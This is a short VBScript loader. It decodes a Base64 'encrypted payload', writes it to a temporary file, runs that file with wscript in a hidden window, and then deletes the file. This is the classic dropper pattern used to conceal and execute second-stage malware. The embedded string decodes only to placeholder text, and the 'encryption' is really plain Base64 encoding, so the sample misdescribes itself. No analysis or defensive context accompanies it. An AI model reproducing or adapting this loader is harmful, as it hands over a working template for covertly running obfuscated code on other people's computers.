Option Explicit

Dim shell, fso, tempPath, encryptedScript, decryptedScript, scriptFile

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
scriptFile = tempPath & "\temp_script.vbs"

' Encrypted payload (Base64 encoded)
encryptedScript = "VG90YWxseSB5b3UgbmVlZCB0byBkZWNyeXB0IHRoaXMgc2NyaXB0IGZvciB0aGUgc2VsZi1kZWNyeXB0aW9uIGZ1bmN0aW9uYWxpdHkuIFRoZSBzY3JpcHQgaXMgZW5jcnlwdGVkIHdpdGggYSBrZXkgdGhhdCBjYW4gYmUgdXNlZCB0byBkZWNyeXB0IGl0cyBvd24gY29udGVudC4="

' Decrypt and save to temp file
decryptedScript = Base64Decode(encryptedScript)
fso.CreateTextFile(scriptFile, True).Write decryptedScript

' Execute the decrypted script
shell.Run "wscript """ & scriptFile & """", 0, True

' Clean up
On Error Resume Next
fso.DeleteFile scriptFile
On Error GoTo 0

Set shell = Nothing
Set fso = Nothing

Function Base64Decode(str)
    Dim objXML, objNode
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("base64")
    objNode.dataType = "bin.base64"
    objNode.text = str
    Base64Decode = Stream_BinaryToString(objNode.nodeTypedValue)
End Function

Function Stream_BinaryToString(bin)
    Dim strStream
    Set strStream = CreateObject("ADODB.Stream")
    strStream.Type = 1
    strStream.Open
    strStream.Write bin
    strStream.Position = 0
    strStream.Type = 2
    strStream.Charset = "utf-8"
    Stream_BinaryToString = strStream.ReadText
    strStream.Close
End Function